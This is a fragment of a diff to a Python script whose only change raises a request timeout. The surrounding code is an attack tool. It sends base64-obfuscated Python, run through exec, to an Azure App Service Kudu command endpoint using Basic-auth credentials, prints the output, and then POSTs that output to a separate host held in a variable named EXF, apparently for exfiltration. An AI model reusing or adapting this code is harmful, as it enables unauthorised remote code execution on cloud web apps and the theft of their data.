@@ -88,7 +88,7 @@ command = "python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').d
 body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
 auth = base64.b64encode((ku + ":" + kp).encode()).decode()
 req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization": "Basic " + auth, "Content-Type": "application/json"})
-result = urllib.request.urlopen(req, timeout=100).read()
+result = urllib.request.urlopen(req, timeout=180).read()
 print(result.decode())
 try:
     urllib.request.urlopen(urllib.request.Request(EXF, data=result, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
